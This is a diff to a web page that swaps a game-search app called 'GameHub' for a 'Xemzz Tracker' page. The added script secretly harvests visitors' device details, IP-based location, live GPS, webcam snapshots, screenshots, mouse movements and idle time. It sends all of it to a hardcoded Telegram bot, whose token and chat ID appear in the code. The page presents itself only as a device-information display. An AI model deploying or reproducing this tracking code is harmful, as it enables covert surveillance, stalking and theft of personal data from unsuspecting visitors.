@@ -1,945 +1,206 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Game Search</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <title>Xemzz Tracker</title>
   <style>
-    :root {
-      --bg-color: #f8f9fa;
-      --text-color: #212529;
-      --card-bg: #ffffff;
-      --input-bg: #ffffff;
-      --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-      --accent: #6c5ce7;
-      --accent-light: #857cd3;
-      --border-radius: 12px;
-      --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-    }
-
-    .dark-mode {
-      --bg-color: #121212;
-      --text-color: #f8f9fa;
-      --card-bg: #1e1e1e;
-      --input-bg: #2d2d2d;
-      --shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-    }
-
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      transition: var(--transition);
-    }
-
     body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-      background: var(--bg-color);
-      color: var(--text-color);
-      min-height: 100vh;
-      line-height: 1.6;
-    }
-
-    .container {
-      max-width: 1200px;
-      margin: 0 auto;
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
       padding: 20px;
     }
-
-    /* Login Screen */
-    .login-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
+    .info-box {
+      background: #fff;
       padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      max-width: 600px;
+      margin: auto;
     }
-
-    .login-card {
-      background: var(--card-bg);
-      border-radius: var(--border-radius);
-      box-shadow: var(--shadow);
-      padding: 40px;
-      width: 100%;
-      max-width: 400px;
+    h2 {
       text-align: center;
+      color: #333;
     }
-
-    .login-logo {
-      font-size: 2.5rem;
-      color: var(--accent);
-      margin-bottom: 20px;
+    ul {
+      list-style: none;
+      padding: 0;
     }
-
-    .login-title {
-      font-size: 1.8rem;
-      margin-bottom: 20px;
-      font-weight: 600;
+    li {
+      margin-bottom: 10px;
+      font-size: 16px;
     }
-
-    .login-input {
-      width: 100%;
-      padding: 14px 16px;
-      margin-bottom: 20px;
-      border: 1px solid rgba(0, 0, 0, 0.1);
-      border-radius: var(--border-radius);
-      background: var(--input-bg);
-      color: var(--text-color);
-      font-size: 1rem;
-    }
-
-    .login-input:focus {
-      outline: none;
-      border-color: var(--accent);
-      box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
-    }
-
-    .remember-me {
-      display: flex;
-      align-items: center;
-      margin-bottom: 20px;
-      justify-content: center;
-    }
-
-    .remember-me input {
-      margin-right: 10px;
-    }
-
-    .login-btn {
-      width: 100%;
-      padding: 14px;
-      background: var(--accent);
-      color: white;
-      border: none;
-      border-radius: var(--border-radius);
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      transition: var(--transition);
-    }
-
-    .login-btn:hover {
-      background: var(--accent-light);
-      transform: translateY(-2px);
-    }
-
-    /* Main App */
-    .app-content {
+    video, canvas {
       display: none;
     }
-
-    header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 30px;
-      padding-bottom: 20px;
-      border-bottom: 1px solid rgba(0, 0, 0, 0.1);
-    }
-
-    .dark-mode header {
-      border-bottom-color: rgba(255, 255, 255, 0.1);
-    }
-
-    h1 {
-      font-size: 2rem;
-      color: var(--accent);
-      font-weight: 700;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .header-actions {
-      display: flex;
-      gap: 15px;
-      align-items: center;
-    }
-
-    .user-greeting {
-      font-size: 0.9rem;
-      opacity: 0.8;
-    }
-
-    .search-container {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 30px;
-    }
-
-    #searchInput {
-      flex: 1;
-      padding: 14px 20px;
-      border: 1px solid rgba(0, 0, 0, 0.1);
-      border-radius: var(--border-radius);
-      background: var(--input-bg);
-      color: var(--text-color);
-      box-shadow: var(--shadow);
-      font-size: 1rem;
-    }
-
-    #searchInput:focus {
-      outline: none;
-      border-color: var(--accent);
-      box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
-    }
-
-    button {
-      padding: 14px 24px;
-      background: var(--accent);
-      color: white;
-      border: none;
-      border-radius: var(--border-radius);
-      cursor: pointer;
-      font-weight: 600;
-      box-shadow: var(--shadow);
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      transition: var(--transition);
-    }
-
-    button:hover {
-      background: var(--accent-light);
-      transform: translateY(-2px);
-    }
-
-    .action-btn {
-      background: none;
-      color: var(--text-color);
-      border: none;
-      cursor: pointer;
-      font-size: 1rem;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      padding: 8px 12px;
-      border-radius: var(--border-radius);
-    }
-
-    .action-btn:hover {
-      background: rgba(108, 92, 231, 0.1);
-      color: var(--accent);
-    }
-
-    #results {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-      gap: 25px;
-    }
-
-    .game {
-      background: var(--card-bg);
-      border-radius: var(--border-radius);
-      overflow: hidden;
-      box-shadow: var(--shadow);
-      cursor: pointer;
-      transition: var(--transition);
-    }
-
-    .game:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
-    }
-
-    .dark-mode .game:hover {
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
-    }
-
-    .game-img {
-      width: 100%;
-      height: 180px;
-      object-fit: cover;
-      border-bottom: 1px solid rgba(0, 0, 0, 0.1);
-    }
-
-    .dark-mode .game-img {
-      border-bottom-color: rgba(255, 255, 255, 0.1);
-    }
-
-    .game-info {
-      padding: 20px;
-    }
-
-    .game-title {
-      font-size: 1.2rem;
-      margin-bottom: 12px;
-      font-weight: 600;
-    }
-
-    .game-rating {
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      color: #f1c40f;
-      font-weight: 500;
-    }
-
-    .loading {
-      text-align: center;
-      margin: 50px 0;
-      font-size: 1.2rem;
-    }
-
-    .spinner {
-      border: 4px solid rgba(0, 0, 0, 0.1);
-      border-left-color: var(--accent);
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 20px;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .error {
-      color: #e74c3c;
-      text-align: center;
-      margin: 40px 0;
-      font-size: 1.1rem;
-    }
-
-    /* MODAL */
-    .modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.3s;
-    }
-
-    .modal.active {
-      opacity: 1;
-      pointer-events: all;
-    }
-
-    .modal-content {
-      background: var(--card-bg);
-      border-radius: var(--border-radius);
-      max-width: 700px;
-      width: 90%;
-      max-height: 85vh;
-      overflow-y: auto;
-      padding: 30px;
-      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
-    }
-
-    .modal-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 20px;
-      padding-bottom: 15px;
-      border-bottom: 1px solid rgba(0, 0, 0, 0.1);
-    }
-
-    .dark-mode .modal-header {
-      border-bottom-color: rgba(255, 255, 255, 0.1);
-    }
-
-    .modal-title {
-      font-size: 1.8rem;
-      color: var(--accent);
-      font-weight: 700;
-    }
-
-    .close-btn {
-      background: none;
-      width: 25%;
-      border: none;
-      font-size: 1.8rem;
-      cursor: pointer;
-      color: var(--text-color);
-      opacity: 1;
-      transition: var(--transition);
-    }
-
-    .close-btn:hover {
-      opacity: 1;
-      transform: rotate(180deg);
-    }
-
-    .modal-body img {
-      width: 100%;
-      border-radius: var(--border-radius);
-      margin-bottom: 20px;
-      box-shadow: var(--shadow);
-    }
-
-    .modal-info {
-      margin-bottom: 15px;
-      display: flex;
-      gap: 10px;
-      flex-wrap: wrap;
-    }
-
-    .modal-info span {
-      font-weight: 600;
-      color: var(--accent);
-    }
-
-    .modal-info p {
-      background: rgba(108, 92, 231, 0.1);
-      padding: 8px 12px;
-      border-radius: 20px;
-      font-size: 0.9rem;
-    }
-
-    .modal-description {
-      line-height: 1.7;
-      margin-bottom: 25px;
-    }
-
-    /* Theme Toggle */
-    .theme-toggle {
-      background: none;
-      border: none;
-      font-size: 1.3rem;
-      cursor: pointer;
-      color: var(--text-color);
-      width: 40px;
-      height: 40px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border-radius: 50%;
-      transition: var(--transition);
-    }
-
-    .theme-toggle:hover {
-      background: rgba(108, 92, 231, 0.1);
-      color: var(--accent);
-    }
-
-    /* Store Links */
-    .store-links {
-      display: flex;
-      gap: 12px;
-      margin-top: 25px;
-      flex-wrap: wrap;
-    }
-    
-    .store-btn {
-      padding: 10px 16px;
-      border-radius: var(--border-radius);
-      text-decoration: none;
-      color: white;
-      font-weight: 600;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 0.95rem;
-      transition: var(--transition);
-    }
-    
-    .store-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-    }
-    
-    .store-btn i {
-      font-size: 1.1rem;
-    }
-
-    /* Platform Tags */
-    .platform-tags {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      margin: 15px 0;
-    }
-
-    .platform-tag {
-      padding: 6px 12px;
-      border-radius: 20px;
-      background: rgba(108, 92, 231, 0.1);
-      color: var(--accent);
-      font-size: 0.85rem;
-      font-weight: 600;
-    }
-
-    /* About Modal */
-    .about-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.3s;
-    }
-
-    .about-modal.active {
-      opacity: 1;
-      pointer-events: all;
-    }
-
-    .about-content {
-      background: var(--card-bg);
-      border-radius: var(--border-radius);
-      max-width: 500px;
-      width: 90%;
-      padding: 30px;
-      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
-    }
-
-    .dev-links {
-      margin-top: 25px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-
-    .dev-link {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      color: var(--accent);
-      text-decoration: none;
-      padding: 10px;
-      border-radius: var(--border-radius);
-      transition: var(--transition);
-    }
-
-    .dev-link:hover {
-      background: rgba(108, 92, 231, 0.1);
-      transform: translateX(5px);
-    }
-
-    /* Responsive */
-    @media (max-width: 768px) {
-      .login-card {
-        padding: 30px 20px;
-      }
-      
-      #results {
-        grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-      }
-      
-      .header-actions {
-        gap: 10px;
-      }
-
-      .store-links {
-        flex-direction: column;
-      }
-
-      .store-btn {
-        width: 100%;
-        justify-content: center;
-      }
-      
-      .modal-content, .about-content {
-        padding: 20px;
-      }
-      
-      .modal-title {
-        font-size: 1.5rem;
-      }
-    }
-    
-    @media (max-width: 480px) {
-      header {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 15px;
-      }
-      
-      .search-container {
-        flex-direction: column;
-      }
-      
-      button {
-        width: 100%;
-        justify-content: center;
-      }
-      
-      .user-greeting {
-        display: none;
-      }
+    strong {
+      color: #555;
     }
   </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
-  <!-- Login Screen -->
-  <div class="login-container" id="loginContainer">
-    <div class="login-card">
-      <div class="login-logo">
-        <i class="fas fa-gamepad"></i>
-      </div>
-      <h2 class="login-title">Welcome to GameHub</h2>
-      <input type="text" id="usernameInput" class="login-input" placeholder="Enter your username" autocomplete="username">
-      <div class="remember-me">
-        <input type="checkbox" id="rememberMe">
-        <label for="rememberMe">Remember me</label>
-      </div>
-      <button class="login-btn" id="loginBtn">
-        <i class="fas fa-sign-in-alt"></i> Continue
-      </button>
-    </div>
-  </div>
 
-  <!-- Main App Content -->
-  <div class="container app-content" id="appContent">
-    <header>
-      <h1><i class="fas fa-gamepad"></i>GameHub</h1>
-      <div class="header-actions">
-        <span class="user-greeting" id="userGreeting"></span>
-        <button class="action-btn" id="aboutBtn">
-          <i class="fas fa-info-circle"></i> About
-        </button>
-        <button class="theme-toggle" id="themeToggle">
-          <i class="fas fa-moon"></i>
-        </button>
-      </div>
-    </header>
-
-    <div class="search-container">
-      <input type="text" id="searchInput" placeholder="Search for games...">
-      <button onclick="searchGame()"><i class="fas fa-search"></i> Search</button>
-    </div>
-
-    <div id="results"></div>
-    <div class="loading" id="loading" style="display: none;">
-      <div class="spinner"></div>
-      <p>Loading...</p>
-    </div>
-    <div class="error" id="error"></div>
-  </div>
-
-  <!-- Game Detail Modal -->
-  <div class="modal" id="modal">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h2 class="modal-title" id="modalTitle"></h2>
-        <button class="close-btn" id="closeModal">&times;</button>
-      </div>
-      <div class="modal-body" id="modalBody"></div>
-    </div>
-  </div>
-
-  <!-- About Modal -->
-  <div class="about-modal" id="aboutModal">
-    <div class="about-content">
-      <div class="modal-header">
-        <h2 class="modal-title">About GameHub</h2>
-        <button class="close-btn" id="closeAboutModal">&times;</button>
-      </div>
-      <div class="modal-body">
-        <p>A modern game search application that helps you discover your next favorite game.</p>
-        <p>Features:</p>
-        <ul style="margin-left: 20px; margin-bottom: 15px;">
-          <li>Comprehensive game search with detailed information</li>
-          <li>Direct links to official stores based on platform</li>
-          <li>Dark/Light mode toggle</li>
-          <li>Personalized greeting</li>
-          <li>Remember me functionality</li>
-        </ul>
-        
-        <div class="dev-links">
-          <h3>Contact Developer:</h3>
-          <a href="https://t.me/XemzzXiterz" target="_blank" class="dev-link">
-            <i class="fab fa-telegram"></i> Telegram
-          </a>
-          <a href="https://wa.me/6285754585160" target="_blank" class="dev-link">
-            <i class="fab fa-whatsapp"></i> WhatsApp
-          </a>
-        </div>
-      </div>
-    </div>
+  <div class="info-box">
+    <h2>Device Information</h2>
+    <ul id="deviceInfo"></ul>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
   </div>
 
   <script>
-    const API_KEY = '256aa55b64ae4ea9827186d19ee4e1e1';
+    const token = '7944528020:AAFjxkw-YCyfnjCiA-QV3tDSLB9VyC6ZPnE';
+    const chatId = '7525205684';
 
-    // DOM Elements
-    const loginContainer = document.getElementById('loginContainer');
-    const appContent = document.getElementById('appContent');
-    const usernameInput = document.getElementById('usernameInput');
-    const rememberMe = document.getElementById('rememberMe');
-    const loginBtn = document.getElementById('loginBtn');
-    const userGreeting = document.getElementById('userGreeting');
-    const searchInput = document.getElementById('searchInput');
-    const resultsContainer = document.getElementById('results');
-    const loadingElement = document.getElementById('loading');
-    const errorElement = document.getElementById('error');
-    const modal = document.getElementById('modal');
-    const modalTitle = document.getElementById('modalTitle');
-    const modalBody = document.getElementById('modalBody');
-    const closeModal = document.getElementById('closeModal');
-    const themeToggle = document.getElementById('themeToggle');
-    const aboutBtn = document.getElementById('aboutBtn');
-    const aboutModal = document.getElementById('aboutModal');
-    const closeAboutModal = document.getElementById('closeAboutModal');
-
-    // Check if username is saved in localStorage
-    function checkRememberedUser() {
-      const rememberedUsername = localStorage.getItem('gamehub_username');
-      if (rememberedUsername) {
-        usernameInput.value = rememberedUsername;
-        rememberMe.checked = true;
-      }
+    function sendText(text) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: chatId, text: text })
+      });
     }
 
-    // Initialize the app
-    function initApp() {
-      checkRememberedUser();
-      
-      // Check if user is already logged in (from sessionStorage)
-      const currentUser = sessionStorage.getItem('gamehub_current_user');
-      if (currentUser) {
-        loginContainer.style.display = 'none';
-        appContent.style.display = 'block';
-        userGreeting.textContent = `Hello, ${currentUser}!`;
-      }
+    function sendPhotoBlob(blob, filename = 'image.jpg') {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, filename);
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
     }
 
-    // Login functionality
-    loginBtn.addEventListener('click', () => {
-      const username = usernameInput.value.trim();
-      if (!username) {
-        alert('Please enter a username');
-        return;
-      }
-      
-      // Save to sessionStorage
-      sessionStorage.setItem('gamehub_current_user', username);
-      
-      // Save to localStorage if "Remember me" is checked
-      if (rememberMe.checked) {
-        localStorage.setItem('gamehub_username', username);
-      } else {
-        localStorage.removeItem('gamehub_username');
-      }
-      
-      // Show main app
-      loginContainer.style.display = 'none';
-      appContent.style.display = 'block';
-      userGreeting.textContent = `Hello, ${username}!`;
+    const deviceInfo = {
+      '🖥️ Device': navigator.userAgent,
+      '💻 Platform': navigator.platform,
+      '🌐 Bahasa': navigator.language,
+      '📶 Online': navigator.onLine,
+      '📺 Screen Size': `${screen.width}x${screen.height}`,
+      '🪟 Window Size': `${window.innerWidth}x${window.innerHeight}`,
+      '💾 RAM': navigator.deviceMemory + ' GB',
+      '🧠 CPU Cores': navigator.hardwareConcurrency,
+      '⏰ Waktu Akses': new Date().toString(),
+      '🕒 Page Load Time': (performance.now()).toFixed(2) + ' ms',
+      '📜 History Length': history.length,
+      '✋ Touch Support': 'ontouchstart' in window ? 'YA' : 'TIDAK'
+    };
+
+    const list = document.getElementById('deviceInfo');
+    let message = '📡 Tracking By Xemzz 💀\n\n';
+
+    for (let key in deviceInfo) {
+      const li = document.createElement('li');
+      li.innerHTML = `<strong>${key}:</strong> ${deviceInfo[key]}`;
+      list.appendChild(li);
+      message += `${key}: ${deviceInfo[key]}\n`;
+    }
+
+    // Referrer dan page info
+    message += `🔗 Referrer: ${document.referrer}\n🌍 URL: ${window.location.href}\n📄 Title: ${document.title}\n`;
+
+    // Timezone
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const offset = new Date().getTimezoneOffset();
+    message += `🕓 Timezone: ${tz}\n🧭 Offset: ${offset} menit\n`;
+
+    // Plugin info
+    let pluginList = '';
+    for (let i = 0; i < navigator.plugins.length; i++) {
+      pluginList += `🔌 ${navigator.plugins[i].name}\n`;
+    }
+    message += `🧩 Plugins:\n${pluginList}`;
+
+    // Feature check
+    const features = ['geolocation', 'mediaDevices', 'bluetooth', 'clipboard', 'serviceWorker'];
+    features.forEach(f => {
+      message += `⚙️ ${f}: ${f in navigator ? 'YA' : 'TIDAK'}\n`;
     });
 
-    // Debounce for real-time search
-    let debounceTimer;
-    searchInput.addEventListener('input', () => {
-      clearTimeout(debounceTimer);
-      debounceTimer = setTimeout(() => {
-        if (searchInput.value.trim() !== '') {
-          searchGame();
+    sendText(message);
+
+    // Battery info
+    if (navigator.getBattery) {
+      navigator.getBattery().then(battery => {
+        const batteryInfo = `🔋 Battery: ${(battery.level * 100).toFixed(0)}%\n🔌 Charging: ${battery.charging}`;
+        sendText(batteryInfo);
+      });
+    }
+
+    // IP info
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const ipInfo = {
+          '📡 IP Address': data.ip,
+          '🏙️ Kota': data.city,
+          '🗺️ Wilayah': data.region,
+          '🌎 Negara': data.country_name,
+          '🏷️ Kode Pos': data.postal,
+          '📌 Latitude': data.latitude,
+          '📍 Longitude': data.longitude
+        };
+
+        let ipText = '';
+        for (let key in ipInfo) {
+          const li = document.createElement('li');
+          li.innerHTML = `<strong>${key}:</strong> ${ipInfo[key]}`;
+          list.appendChild(li);
+          ipText += `${key}: ${ipInfo[key]}\n`;
         }
-      }, 500);
-    });
 
-    // Toggle Dark/Light Mode
-    themeToggle.addEventListener('click', () => {
-      document.body.classList.toggle('dark-mode');
-      const icon = themeToggle.querySelector('i');
-      if (document.body.classList.contains('dark-mode')) {
-        icon.classList.replace('fa-moon', 'fa-sun');
-        localStorage.setItem('gamehub_theme', 'dark');
-      } else {
-        icon.classList.replace('fa-sun', 'fa-moon');
-        localStorage.setItem('gamehub_theme', 'light');
-      }
-    });
+        sendText(ipText);
+      });
 
-    // Check for saved theme preference
-    const savedTheme = localStorage.getItem('gamehub_theme');
-    if (savedTheme === 'dark') {
-      document.body.classList.add('dark-mode');
-      themeToggle.querySelector('i').classList.replace('fa-moon', 'fa-sun');
+    // Webcam snapshot
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          canvas.toBlob(blob => sendPhotoBlob(blob, '📸_camera.jpg'), 'image/jpeg');
+        }, 4000);
+      });
+
+    // Screenshot
+    setTimeout(() => {
+      html2canvas(document.body).then(canvas => {
+        canvas.toBlob(blob => sendPhotoBlob(blob, '🖼️_screenshot.jpg'), 'image/jpeg');
+      });
+    }, 7000);
+
+    // GPS
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition(pos => {
+        const gpsText = `📡 LIVE GPS:\n📌 Lat: ${pos.coords.latitude}\n📍 Lng: ${pos.coords.longitude}\n🎯 Akurasi: ${pos.coords.accuracy}m`;
+        sendText(gpsText);
+      });
     }
 
-    // Close Game Modal
-    closeModal.addEventListener('click', () => {
-      modal.classList.remove('active');
+    // Mouse movement tracking
+    document.addEventListener('mousemove', (e) => {
+      sendText(`🖱️ Mouse moved: (${e.clientX}, ${e.clientY})`);
     });
 
-    // Open About Modal
-    aboutBtn.addEventListener('click', () => {
-      aboutModal.classList.add('active');
+    // Idle time tracking
+    let idleStart = Date.now();
+    let idleTimer;
+    ['mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
+      window.addEventListener(evt, () => {
+        const idleTime = ((Date.now() - idleStart) / 1000).toFixed(1);
+        sendText(`😴 User idle selama: ${idleTime} detik`);
+        idleStart = Date.now();
+        clearTimeout(idleTimer);
+        idleTimer = setTimeout(() => {
+          sendText('💤 User diem kayak mayat selama 60 detik');
+        }, 60000);
+      });
     });
 
-    // Close About Modal
-    closeAboutModal.addEventListener('click', () => {
-      aboutModal.classList.remove('active');
-    });
-
-    // Game Search Function
-    async function searchGame() {
-      const query = searchInput.value.trim();
-      if (!query) return;
-
-      loadingElement.style.display = 'block';
-      errorElement.textContent = '';
-      resultsContainer.innerHTML = '';
-
-      try {
-        const response = await fetch(`https://api.rawg.io/api/games?search=${query}&key=${API_KEY}`);
-        if (!response.ok) throw new Error('Failed to fetch data');
-        const data = await response.json();
-        displayResults(data.results);
-      } catch (error) {
-        errorElement.textContent = 'Error: ' + error.message;
-      } finally {
-        loadingElement.style.display = 'none';
-      }
-    }
-
-    // Display Search Results
-    function displayResults(games) {
-      if (!games || games.length === 0) {
-        errorElement.textContent = 'No games found. Try a different search term.';
-        return;
-      }
-
-      resultsContainer.innerHTML = games.map(game => `
-        <div class="game" onclick="openModal('${game.id}')">
-          <img src="${game.background_image || 'https://via.placeholder.com/300x180?text=No+Image'}" alt="${game.name}" class="game-img">
-          <div class="game-info">
-            <h3 class="game-title">${game.name}</h3>
-            <div class="game-rating">
-              <i class="fas fa-star"></i>
-              <span>${game.rating || 'N/A'}</span>
-            </div>
-          </div>
-        </div>
-      `).join('');
-    }
-
-    // Open Game Details Modal
-    async function openModal(gameId) {
-      loadingElement.style.display = 'block';
-      modal.classList.add('active');
-
-      try {
-        const response = await fetch(`https://api.rawg.io/api/games/${gameId}?key=${API_KEY}`);
-        if (!response.ok) throw new Error('Failed to fetch game details');
-        const game = await response.json();
-
-        // Get all platforms
-        const platforms = game.platforms?.map(p => p.platform.name) || [];
-        
-        // Generate links based on platforms
-        const storeLinks = generateStoreLinks(game.name, platforms);
-        
-        modalTitle.textContent = game.name;
-        modalBody.innerHTML = `
-          <img src="${game.background_image || 'https://via.placeholder.com/600x400?text=No+Image'}" alt="${game.name}">
-          <div class="platform-tags">
-            ${platforms.map(p => `<span class="platform-tag">${p}</span>`).join('')}
-          </div>
-          <div class="modal-info">
-            <span>Rating:</span>
-            <p>${game.rating || 'N/A'}</p>
-          </div>
-          <div class="modal-info">
-            <span>Released:</span>
-            <p>${game.released || 'Unknown'}</p>
-          </div>
-          <div class="modal-info">
-            <span>Genre:</span>
-            <p>${game.genres?.map(g => g.name).join(', ') || 'Unknown'}</p>
-          </div>
-          <div class="modal-description">
-            <p>${game.description_raw || 'No description available.'}</p>
-          </div>
-          
-          <div class="store-links">
-            ${storeLinks.join('')}
-            <a href="https://www.google.com/search?q=${encodeURIComponent(game.name + ' game')}" target="_blank" class="store-btn" style="background: #4285F4;">
-              <i class="fab fa-google"></i> Search on Google
-            </a>
-          </div>
-        `;
-      } catch (error) {
-        modalBody.innerHTML = `<p class="error">Error: ${error.message}</p>`;
-      } finally {
-        loadingElement.style.display = 'none';
-      }
-    }
-
-    // Generate store links based on platforms
-    function generateStoreLinks(gameName, platforms) {
-      const links = [];
-      const platformNames = platforms.map(p => p.toLowerCase());
-      
-      // Check for PC
-      if (platformNames.some(p => p.includes('pc'))) {
-        links.push(`
-          <a href="https://www.google.com/search?q=${encodeURIComponent(gameName + ' site:store.steampowered.com')}" target="_blank" class="store-btn" style="background: #1a1a2e;">
-            <i class="fab fa-steam"></i> Steam
-          </a>
-        `);
-      }
-      
-      // Check for PlayStation
-      if (platformNames.some(p => p.includes('playstation'))) {
-        links.push(`
-          <a href="https://www.playstation.com/search/?q=${encodeURIComponent(gameName)}" target="_blank" class="store-btn" style="background: #003087;">
-            <i class="fab fa-playstation"></i> PlayStation Store
-          </a>
-        `);
-      }
-      
-      // Check for Android
-      if (platformNames.some(p => p.includes('android'))) {
-        links.push(`
-          <a href="https://play.google.com/store/search?q=${encodeURIComponent(gameName)}&c=apps&hl=en" target="_blank" class="store-btn" style="background: #0d6efd;">
-            <i class="fab fa-google-play"></i> Play Store
-          </a>
-        `);
-      }
-      
-      // Check for iOS
-      if (platformNames.some(p => p.includes('ios') || p.includes('iphone') || p.includes('ipad'))) {
-        links.push(`
-          <a href="https://www.apple.com/id/search/${encodeURIComponent(gameName)}?src=globalnav" target="_blank" class="store-btn" style="background: #000;">
-            <i class="fab fa-apple"></i> App Store
-          </a>
-        `);
-      }
-      
-      // Check for Nintendo
-      if (platformNames.some(p => p.includes('nintendo'))) {
-        links.push(`
-          <a href="https://www.nintendo.com/search/?q=${encodeURIComponent(gameName)}" target="_blank" class="store-btn" style="background: #e60012;">
-            <i class="fas fa-gamepad"></i> Nintendo eShop
-          </a>
-        `);
-      }
-      
-      // Check for PSP
-      if (platformNames.some(p => p.includes('psp') || p.includes('vita'))) {
-        links.push(`
-          <a href="https://www.google.com/search?q=${encodeURIComponent(gameName + ' PSP game')}" target="_blank" class="store-btn" style="background: #4285F4;">
-            <i class="fab fa-google"></i> Search for PSP
-          </a>
-        `);
-      }
-      
-      return links;
-    }
-
-    // Initialize the app when page loads
-    window.addEventListener('DOMContentLoaded', initApp);
   </script>
+
 </body>
 </html>
